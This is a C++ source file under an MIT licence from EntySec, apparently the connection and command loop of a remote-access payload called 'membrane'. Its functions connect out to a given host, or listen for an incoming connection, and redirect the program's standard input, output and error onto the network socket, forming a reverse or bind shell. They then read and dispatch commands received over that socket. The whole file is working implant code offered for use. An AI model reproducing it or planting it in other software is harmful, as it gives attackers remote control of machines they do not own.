/*
* MIT License
*
* Copyright (c) 2020-2021 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#include "commands.hpp"

int membrane_connect(std::string host, int port)
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1)
        return -1;

    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    inet_pton(AF_INET, host.c_str(), &hint.sin_addr);

    if (connect(sock, (struct sockaddr*)&hint, sizeof(hint)) == -1)
        return -2;

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    return sock;
}

int membrane_listen(int port)
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1)
        return -1;

    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_addr.s_addr = INADDR_ANY;
    hint.sin_port = htons(port);

    if (bind(sock, (struct sockaddr*)&hint, sizeof(hint)) < 0)
        return -2;

    if (listen(sock, 10) < 0)
        return -3;

    auto addrlen = sizeof(hint);
    int newsock = accept(sock, (struct sockaddr*)&hint, (socklen_t*)&addrlen);

    dup2(newsock, 0);
    dup2(newsock, 1);
    dup2(newsock, 2);

    return newsock;
}

std::vector<std::string> membrane_read()
{
    std::string command;
    std::getline(std::cin, command);

    std::vector<std::string> commands;
    if (!command.empty()) {
        std::replace(command.begin(), command.end(), '\'', '"');

        std::istringstream iss(command);
        std::string s;

        while (iss >> std::quoted(s)) {
            commands.push_back(s);
        }
    }

    return commands;
}

int membrane_execute(std::vector<std::string> commands)
{
    if (passCmds.count(commands[0]) <= 0
        && nopassCmds.count(commands[0]) <= 0)
        return -1;

    if (passCmds.count(commands[0]) > 0)
        passCmds[commands[0]](commands);
    else
        nopassCmds[commands[0]]();

    return 0;
}
